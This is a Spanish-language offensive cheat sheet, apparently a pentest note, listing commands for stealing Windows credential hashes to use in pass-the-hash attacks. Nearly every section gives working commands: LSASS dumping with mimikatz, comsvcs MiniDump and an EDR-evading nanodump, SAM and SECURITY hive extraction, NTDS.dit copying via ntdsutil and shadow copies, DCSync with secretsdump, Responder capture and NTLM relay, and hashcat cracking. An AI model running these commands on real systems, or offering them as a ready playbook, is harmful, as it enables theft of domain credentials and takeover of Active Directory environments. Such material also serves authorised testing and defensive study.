---
aliases:
  - PtH Hash Sources
  - NT Hash Format
  - LM Hash
  - NTLM Hash Format
tags:
  - technique/credential-access
  - technique/lateral-movement
  - asset/active-directory
  - cred/ntlm
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Hash]]"
---
# Pass-the-Hash - Hash Sources & Formats

---

## Hash Format

| **Formato** | **Ejemplo** | **Cuándo** |
|:---:|:---:|:---:|
| Full NTLM (`LM:NT`) | `aad3b435b51404eeaad3b435b51404ee:abc123def456...` | Output secretsdump/mimikatz. |
| NT only (32 hex chars) | `abc123def456789...` | LM viene blank en domains modernos. |
| Impacket flag `-hashes :NT` | `:abc123def456...` (LM blank con `:` prefix) | Standard Impacket. |
| nxc flag `-H` | `nxc smb <t> -u u -H abc123def...` | netexec. |
| Mimikatz `/ntlm:NT` | `sekurlsa::pth /ntlm:abc123...` | On-host. |
| AES256 / AES128 (Kerberos keys) | 64 hex / 32 hex chars | Overpass + Silver/Golden Ticket. |
| DES key (legacy) | 16 hex chars | Pre-Win2008 / RC4-only env. |
^pth-format

**`aad3b435b51404eeaad3b435b51404ee`** = LM hash blank constante. Ignorable. Solo NT importa para PtH.

---

## LSASS Dump

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # privilege::debug` | Habilita SeDebugPrivilege | Pre-dump. |
| `mimikatz # sekurlsa::logonpasswords` | Hashes + cleartext (si WDigest enabled) | Standard. |
| `mimikatz # sekurlsa::msv` | Solo NTLM (less noisy) | Targeted. |
| `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (Sysinternals signed) | Dump lsass offline | Defender-friendly tool. |
| `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-PID> lsass.dmp full` | Native Windows dump (no Mimikatz binary) | Stealth. |
| `pypykatz lsa minidump lsass.dmp` | Parse offline desde Linux | Post-exfil. |
| `nanodump.exe -w lsass.dmp` | Custom mini-dumper (BOF/EXE) | EDR-evasion. |
^pth-lsass

```cmd
:: Standard mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords > creds.txt

:: Native MiniDump (sin Mimikatz binary)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```

```bash
# Parse offline en Linux
pypykatz lsa minidump lsass.dmp
# Output: NT hashes + AES keys + Kerberos tickets
```

---

## SAM (Local Hashes)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `reg save HKLM\SAM SAM; reg save HKLM\SYSTEM SYSTEM` | Local SAM + SYSTEM hive (priv) | Local admin. |
| `impacket-secretsdump LOCAL -sam SAM -system SYSTEM` | Parse offline en Linux | Standard. |
| `samdump2 SYSTEM SAM` | Alt parser | Edge. |
| `nxc smb <target> -u admin -H <hash> --sam` | Remote SAM dump via netexec | Remote local SAM. |
| `nxc smb <target> -u admin -H <hash> --lsa` | LSA secrets (incluye DPAPI master keys, etc) | Bonus. |
^pth-sam

```bash
# Pipeline standard
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY    # bonus: LSA secrets

# Linux parse
impacket-secretsdump LOCAL -sam SAM -system SYSTEM -security SECURITY
```

---

## NTDS.dit Extraction

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ntdsutil "activate instance ntds" "ifm" "create full c:\dump" "quit" "quit"` | NTDS.dit + SYSTEM hive backup en DC | Backup Operators / DA. |
| `impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM` | Parse offline en Linux | Post-exfil. |
| `vssadmin create shadow /for=C:` | VSS snapshot del C: drive | Alt method si ntdsutil bloqueado. |
| `wmic shadowcopy call create Volume='C:\'` | VSS snapshot via WMI | Alt. |
| `secretsdump.py corp/admin:pass@<DC> -just-dc -ntds drsuapi` | DCSync vía Impacket | Sin acceso local. |
^pth-ntds

```cmd
:: Backup Operators path en DC
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\dump" "quit" "quit"
:: Exfiltrar:
::   C:\temp\dump\Active Directory\ntds.dit
::   C:\temp\dump\registry\SYSTEM
```

```bash
# Linux parse offline
impacket-secretsdump LOCAL -ntds 'ntds.dit' -system 'SYSTEM'

# Output:
# Administrator:500:aad3b435...:abc123...:::
# krbtgt:502:aad3b435...:def456...:::
# corp.local\jsmith:1234:aad3b435...:789abc...:::
```

---

## DCSync → Hashes Forest-Wide

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc` | Full hash dump (NTDS via DRSUAPI) | Standard. |
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc-user krbtgt` | Solo krbtgt | Targeted (Golden Ticket prep). |
| `secretsdump.py corp.local/atacante:pass@<DC> -just-dc -hashes :<NT>` | PtH auth + DCSync | Combo. |
| `mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt` | Single user Windows | Standard. |
| `mimikatz # lsadump::dcsync /domain:corp.local /all /csv` | Bulk Windows | Reportable. |
| `nxc smb <DC> -u u -p p --ntds drsuapi` | Auto via netexec | Quick. |
^pth-dcsync

---

## NetNTLMv2 (NO es PtH directo)

| **Comando** | **Qué obtenés** | **Diferencia** |
|:---:|:---:|:---:|
| `responder -I eth0` | Captures NetNTLMv2 challenge-response | **NO es PtH** — solo crackeable o relay. |
| `hashcat -m 5600 ntlmv2.hash wordlist.txt` | Crack offline | Post-capture. |
| `ntlmrelayx.py -tf relay.txt -smb2support` | Relay (no crack) | Direct use sin crack. |
^pth-netntlmv2

**Confusión común:** NetNTLMv2 hash NO es lo mismo que NT hash. NetNTLMv2 = challenge-response salted con timestamp. Solo sirve para crack offline o relay live. NO podés `nxc smb -H <netntlmv2>`.

---

## Cached Credentials (mscash)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `reg save HKLM\SECURITY SECURITY; reg save HKLM\SYSTEM SYSTEM` | SECURITY hive (incluye cached) | Local admin. |
| `impacket-secretsdump LOCAL -system SYSTEM -security SECURITY` | Parse | Linux. |
| `mimikatz # lsadump::cache` | Cached creds Windows | On-host. |
| `hashcat -m 2100 mscash.hash wordlist.txt` | Crack offline (mscash v2 = DCC2) | Post-extract. |
^pth-mscash

**Caveat:** mscash hashes NO son PtH-able. Solo crackeables offline. Sirven cuando user logueó al host pero no podés dumpear LSASS (host offline / no priv).

---
